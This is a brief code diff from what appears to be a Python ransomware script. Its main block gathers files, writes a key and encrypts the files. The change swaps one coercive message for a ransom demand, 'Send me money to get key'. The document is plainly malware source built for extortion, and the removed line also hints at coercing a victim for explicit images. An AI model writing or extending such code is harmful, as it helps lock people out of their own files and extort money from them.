@@ -34,4 +34,4 @@ if __name__ == "__main__":
     append_files()
     write_key(key)
     encrypt(files,key)
-    print("\nSend toe pics or else")
+    print("\nSend me money to get key")
